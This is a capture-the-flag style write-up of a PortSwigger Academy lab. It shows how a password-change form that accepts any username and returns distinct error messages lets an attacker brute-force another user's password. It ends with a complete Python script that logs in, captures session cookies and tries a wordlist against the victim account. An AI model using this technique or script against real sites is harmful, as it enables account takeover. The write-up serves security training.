# Lab Password brute-force via password change

Objective:
This lab's password change functionality makes it vulnerable to brute-force attacks. To solve the lab, use the list of candidate passwords to brute-force Carlos's account and access his "My account" page. 

Your credentials: wiener:peter
Victim's username: carlos 

Start by logging in to wiener:peter

![image](https://user-images.githubusercontent.com/90155329/134266372-b44ce988-71f2-4696-8e0b-33b52bf683ba.png)

This opens a new page where I can reset wiener's credentials

I will reset wiener's password to "password123!" and intercept the request 

![image](https://user-images.githubusercontent.com/90155329/134266385-89f25c60-f9c6-4317-bd7d-ba2c371ebe79.png)

Notice that this POST request contains a username field. This that we can send this request to carlos and if we can guess the password, it will change his password. 

We need to do some more testing. 

When I enter the incorrect password and different new password values, I get "Current password is incorrect"

![image](https://user-images.githubusercontent.com/90155329/134266399-5b36fc66-6ab0-492c-b407-823f3e226dd4.png)

When I enter the password correct, and the new password correct, the password gets successfully reset 

When I enter the current password correct, and the new password incorrect, I get "New passwords do not match"

![image](https://user-images.githubusercontent.com/90155329/134266409-917e30cd-97aa-40d5-8961-6b0746ac7f84.png)

This is good, I will send one of the requests to intruder. The goal is to try and get the "New passwords do not match" error for the carlos user. If we can get this error it means that we are able to determine carlos's password 


Burp Intruder can be used to test different payloads on the same page.

I sent one of the password resets to intruder and set the target position on the current-password value. This is where the payloads will rotate.

![image](https://user-images.githubusercontent.com/90155329/134266428-6d6e8dc9-9312-4245-846d-e647bc7e9d75.png)

I loaded the password list as the payload

![image](https://user-images.githubusercontent.com/90155329/134266442-3f13ea48-eeb3-486e-90a1-e305e6bb3ecf.png)

Added the grep option to check values that contain "New passwords do not match"

I started the attack.

![image](https://user-images.githubusercontent.com/90155329/134266454-6f19cbad-e8dc-4f83-81db-2d7cfc57edeb.png)

the password of "austin" returned the "New passwords do not match error"

This means we were able to determine password the password of the carlos user throught hte password reset function.



I restarted the lab and wrote a python script to do the same attack 


![image](https://user-images.githubusercontent.com/90155329/134266480-6d09ede0-8ee3-44f8-a876-976bd66716b2.png)


![image](https://user-images.githubusercontent.com/90155329/134266489-0a67da6b-88cf-4881-a9e6-52c8b4158bbc.png)

![image](https://user-images.githubusercontent.com/90155329/134266508-a6873466-f4a5-4a45-b742-fabef0c78402.png)

`
		'''
This script is used to complete the "Password brute-force via password change" PortSwigger academy lab. I have the credential's of user wiener. There is a vulnerability in the password reset function which allows me to determine the passwords of other users

'''

import sys 
import urllib
import urllib3
import requests
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'https://127.0.0.1:8080'}

def passBrute(cookie2,url):
	
	with open("passwords.txt","r") as passwords:
		passwords = passwords.readlines()
		
		for password in passwords:
			password = password[:-1]

			cookies = {"session": cookie2}
			data = {"username": "carlos", 
			"current-password": password, 
			"new-password-1": "wrongPass1",
			"new-password-2": "wrongPass232"}

			print("(+) Testing password {}".format(password))
			p = requests.post(url +"/my-account/change-password", data=data,cookies=cookies,proxies=proxies,verify=False)

			if "New passwords do not match" in p.content:
				print("(+)The password of {} worked on Carlos!".format(password))
				exit()

def getSecondCookie(url,p):
	cookie2 = re.findall("[A-Za-z0-9]{32}",str(p.headers))[0]
	passBrute(cookie2,url)

def login(url,cookie1):
	data = {"username": "wiener" , "password": "peter" }
	cookies ={"session": cookie1}
	p = requests.post(url + "/login", data=data, cookies=cookies,verify=False, allow_redirects=False, proxies=proxies)
	getSecondCookie(url,p)

def getFirstCookie(url):
	r = requests.get(url + "/login", verify=False, proxies=proxies)
	cookie1 = re.findall("[A-Za-z0-9]{32}",str(r.headers))[0] 
	login(url,cookie1)

def main():

	if len(sys.argv) != 2:
		print("(+) Incorrect number of arguments")
		print("(+) Example: {} test.com".format(sys.argv[0]))

	else:
		url = sys.argv[1]
		getFirstCookie(url) 

if __name__ == "__main__":

	main()

`
